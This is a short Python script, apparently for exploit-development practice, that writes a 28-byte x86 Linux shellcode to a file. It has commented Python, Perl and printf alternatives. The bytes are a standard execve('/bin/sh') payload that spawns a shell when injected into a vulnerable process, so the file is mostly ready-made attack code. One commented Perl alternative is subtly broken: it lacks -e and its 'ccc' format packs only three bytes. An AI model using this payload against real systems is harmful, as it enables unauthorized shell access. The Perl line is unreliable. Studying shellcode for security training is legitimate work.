# file: shellcode_create.py
# https://unix.stackexchange.com/questions/118247/echo-bytes-to-a-file/118251

# Python
# "<"  # byte order: little endian
# "b" # signed byte
# "B" # unsigned byte
# python -c $'from struct import pack\nwith open("shellcode", "wb") as f: f.write(pack("<BBBBBBBBBBBBBBBBBBBBBBBBBBBB", *bytearray([0xB8,0x32,0x2F,0x73,0x68,0xC1,0xE8,0x08,0x50,0x68,0x2F,0x62,0x69,0x6E,0x89,0xE3,0x31,0xD2,0x52,0x53,0x89,0xE1,0x89,0xD0,0xB0,0x0B,0xCD,0x80])))'

from struct import pack
with open('shellcode', 'wb') as f:
    f.write(pack("<BBBBBBBBBBBBBBBBBBBBBBBBBBBB", 
        *bytearray([0xB8,0x32,0x2F,0x73,0x68,0xC1,0xE8,0x08,0x50,0x68,0x2F,0x62,0x69,0x6E,0x89,0xE3,0x31,0xD2,0x52,0x53,0x89,0xE1,0x89,0xD0,0xB0,0x0B,0xCD,0x80])))

# Perl
# perl -e 'print "\xb8\x32\x2f\x73\x68\xc1\xe8\x08\x50\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\x89\xd0\xb0\x0b\xcd\x80";' > shellcode
# perl 'print pack("ccc",(0xB8,0x32,0x2F,0x73,0x68,0xC1,0xE8,0x08,0x50,0x68,0x2F,0x62,0x69,0x6E,0x89,0xE3,0x31,0xD2,0x52,0x53,0x89,0xE1,0x89,0xD0,0xB0,0x0B,0xCD,0x80))' > shellcode

# bash shell
# printf "%b" '\xb8\x32\x2f\x73\x68\xc1\xe8\x08\x50\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\x89\xd0\xb0\x0b\xcd\x80' > shellcode
